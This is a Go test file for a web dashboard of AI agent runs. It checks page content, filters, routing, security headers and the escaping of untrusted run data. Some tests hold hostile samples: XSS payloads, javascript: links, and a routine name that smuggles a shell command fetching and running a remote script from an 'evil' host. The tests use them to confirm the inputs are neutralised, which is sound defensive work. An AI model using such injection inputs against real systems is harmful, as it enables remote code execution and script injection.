package dashboard

import (
	"context"
	"fmt"
	"io"
	"net/http"
	"net/http/httptest"
	"net/url"
	"os"
	"path/filepath"
	"regexp"
	"slices"
	"strings"
	"testing"
	"time"

	"github.com/staltz/fabrica/internal/runs"
	"github.com/staltz/fabrica/internal/token"
)

const secret = "0123456789abcdef0123456789abcdef0123456789abcdef"

const day = 24 * time.Hour

const (
	shaZ = "zzzzzzz0000000000000000000000000000000zz"
	shaA = "aaaaaaa1111111111111111111111111111111aa"
	shaB = "bbbbbbb2222222222222222222222222222222bb"
)

// world is a database with a little history to look at.
type world struct {
	db      *runs.DB
	now     time.Time
	ids     map[string]string
	started map[string]time.Time
}

func openDB(t testing.TB) *runs.DB {
	t.Helper()
	db, err := runs.Open(filepath.Join(t.TempDir(), "runs.db"))
	if err != nil {
		t.Fatal(err)
	}
	t.Cleanup(func() { db.Close() })
	return db
}

func (w *world) run(t testing.TB, name string, ago time.Duration, r runs.Run, cps ...runs.Checkpoint) {
	t.Helper()
	ctx := context.Background()
	r.ID, r.StartedAt = runs.NewID(w.now.Add(-ago)), w.now.Add(-ago)
	if r.ServedBy == "" {
		r.ServedBy = runs.ServedRemote
	}
	if r.Intent == "" {
		r.Intent = "intent of " + name
	}
	if err := w.db.Begin(ctx, r); err != nil {
		t.Fatal(err)
	}
	for i, c := range cps {
		if c.Author == "" {
			c.Author = runs.ByAgent
		}
		if c.Summary == "" {
			c.Summary = "summary of " + name
		}
		if c.At.IsZero() {
			c.At = r.StartedAt.Add(time.Duration(i+1) * time.Minute)
		}
		if err := w.db.AddCheckpoint(ctx, r.ID, c); err != nil {
			t.Fatal(err)
		}
	}
	w.ids[name], w.started[name] = r.ID, r.StartedAt
}

func (w *world) load(t testing.TB, name, kind, load string) {
	t.Helper()
	if err := w.db.Loaded(context.Background(), w.ids[name], kind, load, w.started[name].Add(time.Second)); err != nil {
		t.Fatal(err)
	}
}

func prURL(n int) []string {
	return []string{"https://github.com/acme/app/pull/" + string(rune('0'+n))}
}

// newWorld seeds, for the last 30 days: seven runs of acme's pr-review (3
// succeeded, 2 failed, 1 stale, 1 in progress; blueprint commit A was first
// served 20 days ago and B 2 days ago), three autofix runs that Fabrica
// refused, one interactive run and one run of another factory's routine. A
// 60-day-old run, with an older commit, is outside the default window.
func newWorld(t testing.TB) *world {
	t.Helper()
	w := &world{db: openDB(t), now: time.Now().UTC(), ids: map[string]string{}, started: map[string]time.Time{}}
	pr := func(sha string) runs.Run {
		return runs.Run{Factory: "acme", Routine: "pr-review", Runtime: "claude-code-cloud", Repo: "github.com/acme/app", BlueprintSHA: sha}
	}
	w.run(t, "ancient", 60*day, pr(shaZ), runs.Checkpoint{Status: runs.Succeeded})
	w.run(t, "first", 20*day, pr(shaA), runs.Checkpoint{Status: runs.Succeeded, Links: prURL(1)})
	w.run(t, "second", 10*day, pr(shaA),
		runs.Checkpoint{Status: runs.Progress, Friction: []runs.Friction{{Kind: "navigation", Note: "couldn't find the retry config"}}},
		runs.Checkpoint{Status: runs.Failed})
	w.run(t, "third", 5*day, pr(shaA), runs.Checkpoint{Status: runs.Succeeded})
	w.run(t, "fourth", 2*day, pr(shaB), runs.Checkpoint{Status: runs.Succeeded, Links: prURL(2)})
	w.run(t, "fifth", day, func() runs.Run { r := pr(shaB); r.Session = "https://claude.ai/code/session_abc"; return r }(),
		runs.Checkpoint{Status: runs.Progress, Friction: []runs.Friction{{Kind: "tools", Note: "the linter was slow"}}},
		runs.Checkpoint{Status: runs.Failed, Links: append(prURL(2), "https://github.com/acme/app/issues/9")})
	w.run(t, "stale", 9*time.Hour, pr(shaB), runs.Checkpoint{Status: runs.Progress, At: w.now.Add(-8 * time.Hour)})
	w.run(t, "going", time.Minute, pr(shaB))
	w.load(t, "going", runs.LoadRoutine, "pr-review")
	w.load(t, "going", runs.LoadSkill, "pr-review")
	w.load(t, "going", runs.LoadRule, "typescript")
	w.load(t, "fifth", runs.LoadSkill, "pr-review")

	autofix := runs.Run{Factory: "acme", Routine: "autofix", Runtime: "claude-code-cloud", Repo: "github.com/acme/api", BlueprintSHA: shaB}
	stub := "Refused: stub is outdated; the factory needs fabrica apply"
	w.run(t, "refused1", 2*day, autofix, runs.Checkpoint{Status: runs.Failed, Author: runs.ByFabrica, Summary: stub})
	w.run(t, "refused2", day, autofix, runs.Checkpoint{Status: runs.Failed, Author: runs.ByFabrica, Summary: stub})
	w.run(t, "refused3", 2*time.Hour, autofix, runs.Checkpoint{Status: runs.Failed, Author: runs.ByFabrica, Summary: "Refused: the repo's AGENTS.md is missing the Fabrica line"})

	w.run(t, "interactive", 3*day, runs.Run{Factory: "acme", Runtime: "claude-code-local", Repo: "github.com/acme/app", ServedBy: runs.ServedLocal},
		runs.Checkpoint{Status: runs.Succeeded})
	w.run(t, "other", 4*day, runs.Run{Factory: "other", Routine: "nightly", Runtime: "codex-cli", Repo: "github.com/o/o", BlueprintSHA: shaA},
		runs.Checkpoint{Status: runs.Succeeded})
	return w
}

// remote is a dashboard the way the remote server has it.
func (w *world) remote(opts ...func(*Options)) http.Handler {
	o := Options{Secret: secret, Now: func() time.Time { return w.now }}
	for _, f := range opts {
		f(&o)
	}
	return New(w.db, o)
}

func do(h http.Handler, method, target string, cookies []*http.Cookie, form url.Values, headers ...string) *httptest.ResponseRecorder {
	var body io.Reader
	if form != nil {
		body = strings.NewReader(form.Encode())
	}
	req := httptest.NewRequest(method, target, body)
	if form != nil {
		req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	}
	for i := 0; i+1 < len(headers); i += 2 {
		req.Header.Set(headers[i], headers[i+1])
	}
	for _, c := range cookies {
		req.AddCookie(c)
	}
	rec := httptest.NewRecorder()
	h.ServeHTTP(rec, req)
	return rec
}

// admin logs in the way a person does, and returns the cookie.
func admin(t testing.TB, h http.Handler, prefix string) []*http.Cookie {
	t.Helper()
	rec := do(h, "POST", prefix+"/_dashboard/login", nil, url.Values{"token": {token.Admin(secret)}})
	if rec.Code != http.StatusSeeOther {
		t.Fatalf("logging in: %d\n%s", rec.Code, rec.Body)
	}
	cookies := rec.Result().Cookies()
	if len(cookies) != 1 {
		t.Fatalf("logging in set %d cookies", len(cookies))
	}
	return cookies
}

// get fetches a page as someone who's logged in.
func get(t testing.TB, h http.Handler, cookies []*http.Cookie, target string) (int, string) {
	t.Helper()
	rec := do(h, "GET", target, cookies, nil)
	return rec.Code, rec.Body.String()
}

func tileValue(t testing.TB, body, label string) string {
	t.Helper()
	m := regexp.MustCompile(`<div class="tile-label">` + regexp.QuoteMeta(label) + `</div><div class="tile-value">([^<]*)</div>`).FindStringSubmatch(body)
	if m == nil {
		t.Fatalf("no %q tile in\n%s", label, body)
	}
	return m[1]
}

func wantIn(t testing.TB, body string, parts ...string) {
	t.Helper()
	for _, p := range parts {
		if !strings.Contains(body, p) {
			t.Errorf("the page doesn't say %q", p)
		}
	}
}

func wantNotIn(t testing.TB, body string, parts ...string) {
	t.Helper()
	for _, p := range parts {
		if strings.Contains(body, p) {
			t.Errorf("the page says %q", p)
		}
	}
}

// preview writes a page to $FABRICA_DASHBOARD_PREVIEW, if that's set, so it
// can be opened in a browser while working on the looks.
func preview(t testing.TB, name, body string) {
	if dir := os.Getenv("FABRICA_DASHBOARD_PREVIEW"); dir != "" {
		_ = os.MkdirAll(dir, 0o755)
		_ = os.WriteFile(filepath.Join(dir, name+".html"), []byte(body), 0o644)
	}
}

func TestOverview(t *testing.T) {
	w := newWorld(t)
	h := w.remote()
	cookies := admin(t, h, "")
	code, body := get(t, h, cookies, "/_dashboard")
	if code != 200 {
		t.Fatalf("overview: %d\n%s", code, body)
	}
	preview(t, "overview", body)

	// The tiles: 12 runs, 5 succeeded and 5 failed, one stale.
	for label, want := range map[string]string{
		"Runs": "12", "Success rate": "50%", "Failed": "5", "Stale": "1", "PRs touched": "2", "Refusals": "3",
	} {
		if got := tileValue(t, body, label); got != want {
			t.Errorf("tile %q is %q, want %q", label, got, want)
		}
	}
	wantIn(t, body, "5 of 10 runs finished", "last 30 days")

	// The routines, most runs first, each linking to its page.
	wantIn(t, body,
		`<a href="/_dashboard/routines/acme/pr-review">pr-review</a>`,
		`<a href="/_dashboard/routines/acme/autofix">autofix</a>`,
		`<a href="/_dashboard/routines/other/nightly">nightly</a>`,
		"Interactive sessions",
		"navigation (1)", // pr-review's top friction (it ties with tools, and the earlier kind wins)
	)
	if strings.Index(body, ">pr-review</a>") > strings.Index(body, ">autofix</a>") {
		t.Error("pr-review has more runs, so it comes before autofix")
	}

	// Refusals say how to fix a stale stub.
	wantIn(t, body, "Refused: stub is outdated; the factory needs fabrica apply",
		"Run <code>fabrica apply</code> for factory acme.",
		"Refused: the repo&#39;s AGENTS.md is missing the Fabrica line", "the latest run")

	// Friction: the counts per kind, and the notes with a link to their run.
	wantIn(t, body, "the linter was slow", "couldn&#39;t find the retry config",
		`href="/_dashboard/runs/`+w.ids["fifth"]+`"`)

	// PRs, with a link to each (the issue isn't one).
	wantIn(t, body, `href="https://github.com/acme/app/pull/2"`, "acme/app#2", "acme/app#1")
	wantNotIn(t, body, "issues/9")

	// The chart and its numbers.
	wantIn(t, body, "<svg", `id="runs-per-day-t"`, "Show the numbers as a table", "Succeeded", "In progress")
	wantNotIn(t, body, "No runs in the last 30 days")
}

func TestOverviewFilters(t *testing.T) {
	w := newWorld(t)
	h := w.remote()
	cookies := admin(t, h, "")
	for _, tc := range []struct {
		query         string
		runs, success string
	}{
		{"", "12", "50%"},
		{"?days=7", "10", ""},
		{"?days=90", "13", ""},
		{"?days=1000", "12", ""}, // not one of the choices, so the default
		{"?kind=routines", "11", ""},
		{"?kind=interactive", "1", "100%"},
		{"?kind=nonsense", "12", ""},
		{"?factory=other", "1", "100%"},
		{"?factory=acme&kind=routines&days=7", "8", ""},
		{"?factory=nope", "0", "–"},
	} {
		code, body := get(t, h, cookies, "/_dashboard"+tc.query)
		if code != 200 {
			t.Errorf("%s: %d", tc.query, code)
			continue
		}
		if got := tileValue(t, body, "Runs"); got != tc.runs {
			t.Errorf("%s: %s runs, want %s", tc.query, got, tc.runs)
		}
		if tc.success != "" {
			if got := tileValue(t, body, "Success rate"); got != tc.success {
				t.Errorf("%s: success rate %s, want %s", tc.query, got, tc.success)
			}
		}
	}

	// The filters are links that keep each other's choices, and say which is current.
	_, body := get(t, h, cookies, "/_dashboard?factory=acme&days=7")
	wantIn(t, body,
		`href="/_dashboard?days=7">All</a>`,
		`aria-current="true">acme</a>`,
		`aria-current="true">7 days</a>`,
		`href="/_dashboard?factory=acme">30 days</a>`,
		`href="/_dashboard?days=7&amp;factory=acme&amp;kind=routines">Routines</a>`,
		`href="/_dashboard?days=7&amp;factory=other">other</a>`,
	)
	// A factory with no runs in the window is still shown when asked for.
	_, body = get(t, h, cookies, "/_dashboard?factory=ghost")
	wantIn(t, body, `aria-current="true">ghost</a>`, "No runs in the last 30 days (factory ghost)")
}

func TestOverviewOfNothing(t *testing.T) {
	db := openDB(t)
	h := New(db, Options{Secret: secret})
	cookies := admin(t, h, "")
	code, body := get(t, h, cookies, "/_dashboard")
	if code != 200 {
		t.Fatalf("%d\n%s", code, body)
	}
	preview(t, "overview-empty", body)
	wantIn(t, body,
		"No runs in the last 30 days. Runs show up here once agents call run_begin.",
		"No routines ran in the last 30 days",
		"No refusals in the last 30 days",
		"No friction notes in the last 30 days",
		"No PRs in the last 30 days",
	)
	for _, label := range []string{"Runs", "Failed", "Stale", "PRs touched", "Refusals"} {
		if got := tileValue(t, body, label); got != "0" {
			t.Errorf("tile %q is %q", label, got)
		}
	}
	if got := tileValue(t, body, "Success rate"); got != "–" {
		t.Errorf("success rate is %q", got)
	}
	wantNotIn(t, body, "<svg", "NaN", "Inf")
}

func TestRoutinePage(t *testing.T) {
	w := newWorld(t)
	subjects := map[string]string{shaB: "Tell pr-review to run the linter first"}
	h := w.remote(func(o *Options) {
		o.Subject = func(_ context.Context, factory, sha string) string {
			if factory != "acme" {
				return ""
			}
			return subjects[sha]
		}
	})
	cookies := admin(t, h, "")
	code, body := get(t, h, cookies, "/_dashboard/routines/acme/pr-review")
	if code != 200 {
		t.Fatalf("%d\n%s", code, body)
	}
	preview(t, "routine", body)

	for label, want := range map[string]string{"Runs": "7", "Success rate": "60%", "Failed": "2", "Stale": "1", "Friction notes": "2"} {
		if got := tileValue(t, body, label); got != want {
			t.Errorf("tile %q is %q, want %q", label, got, want)
		}
	}
	wantIn(t, body, "<h1>pr-review</h1>", "factory acme", `<a href="/_dashboard">← Overview</a>`)

	// The failure-rate chart marks where each new blueprint commit was first
	// served, in this window: A from 20 days ago and B from 2 days ago, but
	// not Z, which no run of the window got. The subject is in the tooltip
	// when it's known.
	wantNotIn(t, body, "zzzzzzz")
	wantIn(t, body, `id="failure-rate-t"`, ">aaaaaaa<", ">bbbbbbb<",
		"bbbbbbb first served", ": Tell pr-review to run the linter first",
		"<code>aaaaaaa</code>", "<code>bbbbbbb</code>", `<span class="sub">unknown</span>`)
	if n := strings.Count(body, `class="mark"`); n != 2 {
		t.Errorf("%d marker lines, want 2", n)
	}

	// The runs, newest first, and each links to its page.
	wantIn(t, body, `href="/_dashboard/runs/`+w.ids["going"]+`"`, "intent of fifth", "intent of first")
	wantNotIn(t, body, "intent of ancient", "intent of refused1", "intent of other")
	if strings.Index(body, "intent of going") > strings.Index(body, "intent of first") {
		t.Error("runs aren't newest first")
	}

	// Friction grouped by kind, and loads.
	wantIn(t, body, "navigation (1)", "tools (1)", "couldn&#39;t find the retry config", "the linter was slow")
	wantIn(t, body, "<td>pr-review</td><td>skill</td><td class=\"num\">2 of 7 runs</td>", "<td>typescript</td><td>rule</td><td class=\"num\">1 of 7 runs</td>")
	wantNotIn(t, body, "<td>routine</td>") // every run loads its routine, which says nothing

	// A shorter window leaves out the older marker.
	_, body = get(t, h, cookies, "/_dashboard/routines/acme/pr-review?days=7")
	if n := strings.Count(body, `class="mark"`); n != 1 {
		t.Errorf("%d marker lines in 7 days, want 1", n)
	}
	wantIn(t, body, `aria-current="true">7 days</a>`, `href="/_dashboard/routines/acme/pr-review?days=90"`)
	// ...and one with no runs in it says so.
	w.run(t, "lonely", 80*day, runs.Run{Factory: "acme", Routine: "lonely"}, runs.Checkpoint{Status: runs.Succeeded})
	code, body = get(t, h, cookies, "/_dashboard/routines/acme/lonely")
	wantIn(t, body, "No runs of this routine in the last 30 days. Try a longer window.", "No friction notes from this routine", "No skills or rules were loaded")
	if code != 200 {
		t.Errorf("a routine with no recent runs: %d", code)
	}
}

func TestRunPage(t *testing.T) {
	w := newWorld(t)
	h := w.remote()
	cookies := admin(t, h, "")
	code, body := get(t, h, cookies, "/_dashboard/runs/"+w.ids["fifth"])
	if code != 200 {
		t.Fatalf("%d\n%s", code, body)
	}
	preview(t, "run", body)
	wantIn(t, body,
		"intent of fifth", "acme (served remotely)", "<code title=\""+shaB+"\">bbbbbbb</code>",
		`<a href="/_dashboard/routines/acme/pr-review">pr-review</a> on claude-code-cloud, repo github.com/acme/app`,
		`<a href="https://claude.ai/code/session_abc" rel="noopener noreferrer nofollow">https://claude.ai/code/session_abc</a>`,
		// The timeline: a checkpoint, a friction note, and a checkpoint with links.
		"summary of fifth", "tools: the linter was slow",
		`<a href="https://github.com/acme/app/pull/2" rel="noopener noreferrer nofollow">https://github.com/acme/app/pull/2</a>`,
		"git -C &lt;your blueprint clone&gt; show bbbbbbb:routines/pr-review.md",
	)
	// The friction note follows the checkpoint it was sent with.
	if strings.Index(body, "tools: the linter was slow") < strings.Index(body, "summary of fifth") {
		t.Error("the friction note comes before its checkpoint")
	}

	// Loads of one kind in a row are one line.
	w.load(t, "fifth", runs.LoadSkill, "second-skill")
	_, body = get(t, h, cookies, "/_dashboard/runs/"+w.ids["fifth"])
	wantIn(t, body, "skills <code>pr-review</code>, <code>second-skill</code>")
	// Fabrica's own checkpoints stand out.
	_, body = get(t, h, cookies, "/_dashboard/runs/"+w.ids["refused1"])
	wantIn(t, body, `<span class="who">fabrica</span>`, "Refused: stub is outdated")
	// A run that has nothing yet, and an interactive one.
	_, body = get(t, h, cookies, "/_dashboard/runs/"+w.ids["going"])
	wantIn(t, body, "no checkpoints yet", "in progress", "Started")
	_, body = get(t, h, cookies, "/_dashboard/runs/"+w.ids["interactive"])
	wantIn(t, body, "Interactive session on claude-code-local, repo github.com/acme/app", "acme (served locally)")
	wantNotIn(t, body, "git -C")
}

// Run data is written by agents, so it's text, and only an http(s) URL is a link.
func TestRunDataIsOnlyEverText(t *testing.T) {
	w := newWorld(t)
	nasty := `<script>alert("intent")</script><img src=x onerror=alert(1)>`
	w.run(t, "nasty", time.Hour, runs.Run{Factory: "acme", Routine: "pr-review", Intent: nasty, Session: "javascript:alert(2)"},
		runs.Checkpoint{Status: runs.Failed, Summary: nasty,
			Links:    []string{"javascript:alert(3)", "https://github.com/acme/app/pull/5", "data:text/html,<script>alert(4)</script>/pull/6"},
			Friction: []runs.Friction{{Kind: "other", Note: nasty}}})
	h := w.remote()
	cookies := admin(t, h, "")
	for _, target := range []string{"/_dashboard", "/_dashboard/routines/acme/pr-review", "/_dashboard/runs/" + w.ids["nasty"]} {
		code, body := get(t, h, cookies, target)
		if code != 200 {
			t.Fatalf("%s: %d", target, code)
		}
		wantNotIn(t, body, "<script", "<img", `href="javascript:`, `href="data:text`)
		if target != "/_dashboard" {
			wantIn(t, body, "&lt;script&gt;")
		}
	}
	_, body := get(t, h, cookies, "/_dashboard/runs/"+w.ids["nasty"])
	// The session isn't an https URL, so it's text. A good link still is one.
	wantIn(t, body, "javascript:alert(2)", `href="https://github.com/acme/app/pull/5"`)
	wantNotIn(t, body, `href="javascript:alert(2)"`)
}

func TestUnknownThingsAre404(t *testing.T) {
	w := newWorld(t)
	h := w.remote()
	cookies := admin(t, h, "")
	for _, target := range []string{
		"/_dashboard/routines/acme/nope",
		"/_dashboard/routines/nope/pr-review",
		"/_dashboard/routines/acme/-", // the interactive "routine"
		"/_dashboard/routines/acme",
		"/_dashboard/routines/acme/pr-review/extra",
		"/_dashboard/runs/run_nope",
		"/_dashboard/runs/",
		"/_dashboard/runs/a/b",
		"/_dashboard/nope",
	} {
		code, body := get(t, h, cookies, target)
		if code != 404 {
			t.Errorf("GET %s: %d, want 404", target, code)
		}
		wantIn(t, body, "Not found", "Back to the overview")
	}
	_, body := get(t, h, cookies, "/_dashboard/routines/acme/nope")
	wantIn(t, body, "no runs of routine nope in factory acme")
}

func TestMatches(t *testing.T) {
	for path, want := range map[string]bool{
		"/_dashboard": true, "/_dashboard/": true, "/_dashboard/runs/run_x": true, "/fabrica/_dashboard": true, "/a/b/_dashboard/routines/x/y": true,
		"/healthz": false, "/pr-review": false, "/_admin/runs": false, "/_dashboardx": false, "/x_dashboard": false, "/": false, "": false,
	} {
		if got := Matches(path); got != want {
			t.Errorf("Matches(%q) = %v, want %v", path, got, want)
		}
	}
	for path, want := range map[string][2]string{
		"/_dashboard":                      {"", ""},
		"/fabrica/_dashboard/":             {"/fabrica", ""},
		"/_dashboard/runs/run_x":           {"", "runs/run_x"},
		"/a/_dashboard/b/_dashboard/login": {"/a/_dashboard/b", "login"},
	} {
		if prefix, rest, ok := route(path); !ok || prefix != want[0] || rest != want[1] {
			t.Errorf("route(%q) = %q, %q, %v; want %q, %q", path, prefix, rest, ok, want[0], want[1])
		}
	}
}

func TestOnlyReading(t *testing.T) {
	w := newWorld(t)
	h := w.remote()
	cookies := admin(t, h, "")
	for _, method := range []string{"POST", "PUT", "DELETE", "PATCH"} {
		for _, target := range []string{"/_dashboard", "/_dashboard/runs/" + w.ids["going"], "/_dashboard/routines/acme/pr-review"} {
			rec := do(h, method, target, cookies, url.Values{"x": {"y"}})
			if rec.Code != http.StatusMethodNotAllowed || rec.Header().Get("Allow") != "GET, HEAD" {
				t.Errorf("%s %s: %d, Allow %q", method, target, rec.Code, rec.Header().Get("Allow"))
			}
		}
	}
	// HEAD works, with no body.
	rec := do(h, "HEAD", "/_dashboard", cookies, nil)
	if rec.Code != 200 || rec.Body.Len() != 0 {
		t.Errorf("HEAD: %d with %d bytes", rec.Code, rec.Body.Len())
	}
}

// With a path prefix, links, forms and cookies all keep it.
func TestUnderAPrefix(t *testing.T) {
	w := newWorld(t)
	h := w.remote()
	cookies := admin(t, h, "/fabrica")
	if c := cookies[0]; c.Path != "/fabrica/_dashboard" {
		t.Errorf("the cookie's path is %q", c.Path)
	}
	code, body := get(t, h, cookies, "/fabrica/_dashboard")
	if code != 200 {
		t.Fatalf("%d", code)
	}
	wantIn(t, body, `href="/fabrica/_dashboard/routines/acme/pr-review"`, `href="/fabrica/_dashboard/runs/`, `action="/fabrica/_dashboard/logout"`,
		`href="/fabrica/_dashboard?days=7"`)
	wantNotIn(t, body, `href="/_dashboard`)
	code, body = get(t, h, cookies, "/fabrica/_dashboard/runs/"+w.ids["fifth"])
	wantIn(t, body, `href="/fabrica/_dashboard"`, `href="/fabrica/_dashboard/routines/acme/pr-review"`)
	if code != 200 {
		t.Errorf("run page: %d", code)
	}
	rec := do(h, "GET", "/fabrica/_dashboard", nil, nil)
	wantIn(t, rec.Body.String(), `action="/fabrica/_dashboard/login"`)
}

func TestEveryResponseIsPrivateAndLockedDown(t *testing.T) {
	w := newWorld(t)
	remote := w.remote()
	cookies := admin(t, remote, "")
	local := New(w.db, Options{Code: "the-code"})
	for name, rec := range map[string]*httptest.ResponseRecorder{
		"overview":        do(remote, "GET", "/_dashboard", cookies, nil),
		"routine":         do(remote, "GET", "/_dashboard/routines/acme/pr-review", cookies, nil),
		"run":             do(remote, "GET", "/_dashboard/runs/"+w.ids["going"], cookies, nil),
		"404 run":         do(remote, "GET", "/_dashboard/runs/nope", cookies, nil),
		"404 page":        do(remote, "GET", "/_dashboard/nope", cookies, nil),
		"405":             do(remote, "POST", "/_dashboard", cookies, nil),
		"login page":      do(remote, "GET", "/_dashboard", nil, nil),
		"wrong token":     do(remote, "POST", "/_dashboard/login", nil, url.Values{"token": {"nope"}}),
		"login":           do(remote, "POST", "/_dashboard/login", nil, url.Values{"token": {token.Admin(secret)}}),
		"logout":          do(remote, "POST", "/_dashboard/logout", cookies, nil),
		"login by GET":    do(remote, "GET", "/_dashboard/login", nil, nil),
		"outside":         do(remote, "GET", "/nope", nil, nil),
		"local locked":    do(local, "GET", "/_dashboard", nil, nil),
		"local bad code":  do(local, "GET", "/_dashboard?code=wrong", nil, nil),
		"local code":      do(local, "GET", "/_dashboard?code=the-code", nil, nil),
		"local logout":    do(local, "POST", "/_dashboard/logout", nil, nil),
		"local unlocked?": do(local, "GET", "/_dashboard/runs/x", nil, nil),
	} {
		hd := rec.Header()
		if got := hd.Get("Cache-Control"); got != "no-store" {
			t.Errorf("%s (%d): Cache-Control is %q", name, rec.Code, got)
		}
		if got := hd.Get("Content-Security-Policy"); got != "default-src 'none'; style-src 'unsafe-inline'; img-src data:; form-action 'self'" {
			t.Errorf("%s (%d): Content-Security-Policy is %q", name, rec.Code, got)
		}
		if hd.Get("X-Frame-Options") != "DENY" || hd.Get("X-Content-Type-Options") != "nosniff" || hd.Get("Referrer-Policy") != "no-referrer" {
			t.Errorf("%s (%d): headers are %v", name, rec.Code, hd)
		}
	}
}

// The pages need nothing from anywhere else: no scripts, no fonts, no
// images, no frames, and no URL in them but the ones run data brings.
func TestPagesLoadNothing(t *testing.T) {
	w := newWorld(t)
	h := w.remote()
	cookies := admin(t, h, "")
	local := New(w.db, Options{Code: "c"})
	pages := map[string]string{}
	for _, target := range []string{
		"/_dashboard", "/_dashboard?days=7&kind=routines", "/_dashboard/routines/acme/pr-review", "/_dashboard/routines/acme/autofix",
		"/_dashboard/runs/" + w.ids["fifth"], "/_dashboard/runs/" + w.ids["refused1"], "/_dashboard/runs/nope",
	} {
		_, pages[target] = get(t, h, cookies, target)
	}
	pages["login"] = do(h, "GET", "/_dashboard", nil, nil).Body.String()
	pages["wrong token"] = do(h, "POST", "/_dashboard/login", nil, url.Values{"token": {"x"}}).Body.String()
	pages["locked"] = do(local, "GET", "/_dashboard", nil, nil).Body.String()

	fromRunData := []string{"https://github.com/acme/app/pull/1", "https://github.com/acme/app/pull/2", "https://github.com/acme/app/issues/9", "https://claude.ai/code/session_abc"}
	for name, body := range pages {
		// Every address in a link or form stays on this site, or is run data.
		for _, m := range regexp.MustCompile(`(?:href|action)="([^"]*)"`).FindAllStringSubmatch(body, -1) {
			if !strings.HasPrefix(m[1], "/_dashboard") && m[1] != "data:," && !slices.Contains(fromRunData, m[1]) {
				t.Errorf("%s links to %q", name, m[1])
			}
		}
		for _, u := range fromRunData {
			body = strings.ReplaceAll(body, u, "")
		}
		if strings.Contains(body, "http://") || strings.Contains(body, "https://") {
			i := strings.Index(body, "http")
			t.Errorf("%s has a URL that isn't from run data: …%s…", name, body[max(0, i-40):min(len(body), i+60)])
		}
		for _, bad := range []string{"<script", "<link rel=\"stylesheet", "<iframe", "<img", "@import", "src=\"http", "<object", "<embed", "xmlns"} {
			if strings.Contains(body, bad) {
				t.Errorf("%s has %q", name, bad)
			}
		}
	}
}

// A routine's page is at /routines/<factory>/<routine>, and only names that
// follow the naming rule have one. Agents choose the routine a run records,
// and a refused local run has no factory, so the rest are plain text.
func TestRoutinesLinkOnlyToPagesThatExist(t *testing.T) {
	w := newWorld(t)
	for i, r := range []runs.Run{
		{Routine: "norfactory"}, // a refused local run has no factory
		{Factory: "ac me", Routine: "odd-routine"},
		{Factory: "acme", Routine: "odd/routine?x"},
		{Factory: "acme", Routine: ".."},
		{Factory: "..", Routine: "dotted"},
	} {
		w.run(t, fmt.Sprint("odd", i), time.Hour, r, runs.Checkpoint{Status: runs.Succeeded})
	}
	h := w.remote()
	cookies := admin(t, h, "")
	_, body := get(t, h, cookies, "/_dashboard")
	// The good ones still link, and the others are text.
	wantIn(t, body, `<a href="/_dashboard/routines/acme/pr-review">pr-review</a>`,
		"<td>norfactory<", "<td>odd-routine<", "<td>odd/routine?x<", "<td>..<", "<td>dotted<")
	wantNotIn(t, body, "/_dashboard/routines//", "/_dashboard/routines/ac%20", "/_dashboard/routines/ac me", "routines/acme/odd", "routines/acme/..", "routines/acme/%2E", "routines/../", "routines/%2E")

	for _, name := range []string{"odd0", "odd1", "odd2", "odd3", "odd4"} {
		code, body := get(t, h, cookies, "/_dashboard/runs/"+w.ids[name])
		if code != 200 {
			t.Fatalf("%s: %d", name, code)
		}
		wantNotIn(t, body, "/_dashboard/routines/")
	}
	// The page of a routine with an odd name is still there for whoever types
	// its address, and its filters still work.
	code, body := get(t, h, cookies, "/_dashboard/routines/ac%20me/odd-routine")
	if code != 200 {
		t.Fatalf("the page of a routine with an odd factory: %d", code)
	}
	wantIn(t, body, `href="/_dashboard/routines/ac%20me/odd-routine?days=7"`)
	// The run page of a good routine still links to it.
	_, body = get(t, h, cookies, "/_dashboard/runs/"+w.ids["fifth"])
	wantIn(t, body, `<a href="/_dashboard/routines/acme/pr-review">pr-review</a>`)
}

// The name of a routine is whatever the agent sent run_begin, even when
// Fabrica refused the run, and the run page hands out a command to paste
// into a shell. Only a name that follows the naming rule gets one.
func TestRunPageHasNoCommandForABadRoutineName(t *testing.T) {
	w := newWorld(t)
	evil := "x.md; curl https://evil/p.sh | sh #"
	w.run(t, "evil", time.Hour, runs.Run{Factory: "acme", Routine: evil, BlueprintSHA: shaB},
		runs.Checkpoint{Status: runs.Failed, Author: runs.ByFabrica, Summary: "Refused: there's no routine like that"})
	h := w.remote()
	cookies := admin(t, h, "")
	code, body := get(t, h, cookies, "/_dashboard/runs/"+w.ids["evil"])
	if code != 200 {
		t.Fatalf("%d", code)
	}
	// It's still shown, as text, to make sense of the refusal.
	wantIn(t, body, evil)
	wantNotIn(t, body, "git -C", "blueprint clone", "instructions this run was served")
}

func TestPRLabelsNameTheirHost(t *testing.T) {
	for raw, want := range map[string]string{
		"https://github.com/acme/app/pull/412":                "acme/app#412",
		"http://github.com/acme/app/pull/412":                 "acme/app#412",
		"https://GitHub.com/acme/app/pull/412":                "acme/app#412",
		"https://gitlab.com/acme/app/-/merge_requests/9":      "acme/app!9",
		"https://gitlab.com/group/sub/app/-/merge_requests/9": "group/sub/app!9",
		// Anywhere else the label says where the link goes, so it can't pass
		// for one of GitHub's.
		"https://evil.example/acme/app/pull/412":            "evil.example/acme/app#412",
		"https://github.com.evil.example/acme/app/pull/412": "github.com.evil.example/acme/app#412",
		"https://github.com:8443/acme/app/pull/412":         "github.com:8443/acme/app#412",
		"https://github.com@evil.example/acme/app/pull/412": "evil.example/acme/app#412",
		"https://evil.example/github.com/acme/app/pull/412": "evil.example/github.com/acme/app#412",
		"https://git.acme.dev/acme/app/-/merge_requests/9":  "git.acme.dev/acme/app!9",
		"https://github.com/acme/app/issues/9":              "github.com/acme/app/issues/9",
		"https://evil.example/acme/app/issues/9":            "evil.example/acme/app/issues/9",
	} {
		if got := prLabel(raw); got != want {
			t.Errorf("prLabel(%q) = %q, want %q", raw, got, want)
		}
	}

	// On the page, too.
	w := newWorld(t)
	w.run(t, "spoof", time.Hour, runs.Run{Factory: "acme", Routine: "pr-review"},
		runs.Checkpoint{Status: runs.Succeeded, Links: []string{"https://evil.example/acme/app/pull/412"}})
	h := w.remote()
	_, body := get(t, h, admin(t, h, ""), "/_dashboard")
	wantIn(t, body, "evil.example/acme/app#412", "acme/app#1")
	wantNotIn(t, body, ">acme/app#412<")
}
